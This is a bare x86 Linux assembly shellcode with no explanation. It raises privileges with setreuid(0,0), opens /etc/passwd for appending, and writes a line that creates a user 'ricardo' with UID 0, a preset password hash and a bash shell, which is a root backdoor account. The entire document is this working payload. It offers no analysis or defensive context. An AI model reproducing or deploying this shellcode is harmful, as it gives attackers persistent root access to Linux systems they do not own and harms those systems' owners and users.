section .text

	global _start 

_start:
	xor ecx,ecx
	mov ebx,ecx
	push byte +0x46
	pop eax
	int 0x80

	push byte +0x5
	pop eax
	xor ecx,ecx
	push ecx
	push dword 0x64777373
	push dword 0x61702f2f
	push dword 0x6374652f
	mov ebx,esp
	inc ecx
	mov ch,0x4
	int 0x80

	xchg eax,ebx
	call adduser

	String: db "ricardo:AzvDr.rW3T4ic:0:0::/:/bin/bash",0xA

adduser:
	pop ecx
	mov edx,DWORD [ecx-0x4]
	push 0x4
	pop eax
	int 0x80
	push byte +0x1
	pop eax
	int 0x80
